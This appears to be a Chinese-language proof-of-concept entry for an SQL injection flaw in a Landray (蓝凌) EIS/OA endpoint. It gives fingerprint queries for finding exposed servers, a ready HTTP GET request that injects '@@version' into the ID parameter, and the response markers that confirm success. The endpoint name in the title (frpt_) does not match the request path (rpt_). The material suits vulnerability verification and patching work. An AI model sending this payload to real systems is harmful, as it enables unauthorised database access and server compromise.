﻿# 蓝凌OA frpt_listreport_definefield.aspx接口存在SQL注入漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：蓝凌EIS智慧协同平台是一款专为企业提供高效协同办公和团队合作的产品。该平台集成了各种协同工具和功能，旨在提升企业内部沟通、协作和信息共享的效率。

蓝凌EIS智慧协同平台 frpt_listreport_definefield.aspx接口处存在SQL注入漏洞，未经授权的攻击者可能会利用此漏洞窃取服务器的敏感信息，最终导致服务器失陷

> 漏洞特征：icon_hash="953405444"||app="Landray-OA系统"

> 验证脚本：HTTP

```
GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1


```

> 响应代码特征：500

> 响应内容特征：nvarchar

> 上传文件定位：

> 验证文件来源：蓝凌OA frpt_listreport_definefield.aspx接口存在SQL注入漏洞.poc

